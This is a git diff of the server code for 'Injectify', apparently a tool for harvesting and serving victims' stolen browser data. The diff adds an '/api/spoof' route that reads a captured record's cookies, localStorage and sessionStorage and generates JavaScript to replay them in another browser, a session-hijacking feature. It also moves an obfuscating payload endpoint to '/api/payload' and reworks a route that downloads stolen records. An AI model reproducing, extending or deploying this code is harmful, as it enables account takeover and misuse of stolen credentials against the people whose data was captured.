@@ -1317,7 +1317,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
-	app.get('/api/*', (req, res) => {
+	app.get('/api/json/*', (req, res) => {
 		var getAPI = (name, token) => {
 			return new Promise((resolve, reject) => {
 				request({
@@ -1392,20 +1392,16 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				})
 			})
 		}
-		let array = req.path.substring(5).split('/'),
-			url = array.splice(0,1)
-		url.push(array.join('/'))
 
-		let token = decodeURIComponent(url[0])
-		let project = decodeURIComponent(url[1])
-		if (req.path.toLowerCase().endsWith("&download=true")) project = project.slice(0, -14)
+		let token = req.query.token
+		let project = decodeURIComponent(req.path.substring(10))
 
 		if (project && token) {
 			getAPI(project, token).then(data => {
 				let json = data.json,
 					user = data.user
 				res.setHeader('Content-Disposition', 'filename="Injectify project records [' + json.name + '].json"')
-				if (req.path.toLowerCase().endsWith("&download=true")) {
+				if (typeof req.query.download == 'string') {
 					res.setHeader('Content-Type', 'application/octet-stream')
 				} else {
 					res.setHeader('Content-Type', 'application/json')
@@ -1418,7 +1414,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					json = JSON.stringify(json, null, "    ")
 					res.send(json)
 					console.log(
-						chalk.greenBright("[API] ") +
+						chalk.greenBright("[API/JSON] ") +
 						chalk.yellowBright("delivered ") +
 						chalk.magentaBright(project) +
 						chalk.redBright(" (length=" + json.length + ") ") +
@@ -1441,19 +1437,168 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			res.send(JSON.stringify({
 				title: "Bad request",
 				message: "Specify a project name to return in request",
-				format: "https://injectify.samdd.me/api/" + token + "/PROJECT_NAME"
+				format: "https://injectify.samdd.me/api/json/PROJECT_NAME?token=" + token
 			}, null, "    "))
 		} else {
 			res.setHeader('Content-Type', 'application/json')
 			res.send(JSON.stringify({
 				title: "Bad request",
 				message: "Specify a token & project name to return in request",
-				format: "https://injectify.samdd.me/api/GITHUB_TOKEN/PROJECT_NAME"
+				format: "https://injectify.samdd.me/api/json/PROJECT_NAME?token=GITHUB_TOKEN"
 			}, null, "    "))
 		}
 	})
 
-	app.get('/payload/*', (req, res) => {
+	app.get('/api/spoof/*', (req, res) => {
+		var getAPI = (name, index, token) => {
+			return new Promise((resolve, reject) => {
+				request({
+					url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
+					method: 'GET',
+					headers: {
+						'Accept': 'application/json',
+						'User-Agent': 'Injectify'
+					}
+				}, (error, response, user) => {
+					try {
+						user = JSON.parse(user)
+					} catch(e) {
+						console.error(e, user)
+						reject({
+							title	: "Could not authenticate you",
+							message	: "Failed to parse the GitHub user API response"
+						})
+					}
+					if (!error && response.statusCode == 200 && user.login) {
+						db.collection('projects', (err, projects) => {
+							if (err) throw err
+							projects.findOne({
+								$or: [
+									{"permissions.owners": user.id},
+									{"permissions.admins": user.id},
+									{"permissions.readonly": user.id}
+								],
+								$and: [
+									{"name": name}
+								]
+							}).then(doc => {
+								if(doc !== null) {
+									let record = doc.passwords[index]
+									if (record) {
+										if (record.storage) {
+											let local		= record.storage.local,
+												session		= record.storage.session,
+												cookies 	= record.storage.cookies,
+												js			= ''
+											if (local) {
+												for (var property in local) {
+													if (local.hasOwnProperty(property)) {
+														js += 
+														`localStorage.setItem('` + property.replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `', '` + local[property].replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `');\n`
+													}
+												}
+											}
+											if (session) {
+												for (var property in session) {
+													if (session.hasOwnProperty(property)) {
+														js += 
+														`sessionStorage.setItem('` + property.replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `', '` + session[property].replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `');\n`
+													}
+												}
+											}
+											if (cookies) {
+												for (var property in cookies) {
+													if (cookies.hasOwnProperty(property)) {
+														js +=
+														`document.cookie = '` + property.replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `=` + cookies[property].replace(/\\/g, "\\\\").replace(/'/g, "\\'") + `';\n`
+													}
+												}
+											}
+											// let minified = UglifyJS.minify(js).code
+											// if (minified) js = minified
+											if (js) {
+												resolve({
+													js		: js,
+													project	: doc.name,
+													user	: user
+												})
+											} else {
+												reject({
+													title	: "Nothing to generate",
+													message	: "The requested record didn't contain any storage"
+												})
+											}
+										} else {
+											reject({
+												title	: "Database error",
+												message	: "An internal error occured whilst handling your request"
+											})
+										}
+									} else {
+										reject({
+											title: "Nonexistent index",
+											message: "The index " + index + " doesn't exist for this project"
+										})
+									}
+								} else {
+									reject({
+										title: "Access denied",
+										message: "You don't have permission to access project " + name
+									})
+								}
+							})
+						})
+					} else {
+						reject({
+							title	: "Could not authenticate you",
+							message	: "GitHub API rejected token!"
+						})
+					}
+				})
+			})
+		}
+
+		let token = req.query.token
+		let index = req.query.index
+		let project = decodeURIComponent(req.path.substring(11))
+
+		if (project && token && index) {
+			getAPI(project, index, token).then(data => {
+				let js      = data.js,
+					project = data.project,
+					user    = data.user
+				res.setHeader('Content-Disposition', 'filename="Injectify spoofer [' + project + '].js"')
+				if (typeof req.query.download == 'string') {
+					res.setHeader('Content-Type', 'application/octet-stream')
+				} else {
+					res.setHeader('Content-Type', 'application/javascript')
+				}
+				res.send(js)
+				console.log(
+					chalk.greenBright("[API/SPOOF] ") +
+					chalk.yellowBright("delivered ") +
+					chalk.magentaBright(project) +
+					chalk.redBright(" (length=" + js.length + ") ") +
+					chalk.yellowBright("to ") +
+					chalk.magentaBright(user.login) +
+					chalk.redBright(" (" + user.id + ") ")
+				)
+			}).catch(error => {
+				res.setHeader('Content-Type', 'application/json')
+				res.send(JSON.stringify(error, null, "    "))
+			})
+		} else {
+			res.setHeader('Content-Type', 'application/json')
+			res.send(JSON.stringify({
+				title: "Bad request",
+				message: "Specify a token, project name and index to return in request",
+				format: "https://injectify.samdd.me/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN"
+			}, null, "    "))
+		}
+
+	})
+
+	app.get('/api/payload/*', (req, res) => {
 		function enc(string, eval) {
 			if(req.query.base64 == "false") {
 				if (eval) {
@@ -1673,7 +1818,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						w.remove()
 						})`
 					)
-///////////////////////////////////////////////////////////////////////////
+				///////////////////////////////////////////////////////////////////////////
 
 			if (req.query.obfuscate == "true") {
 				ObfuscateJS(script, {
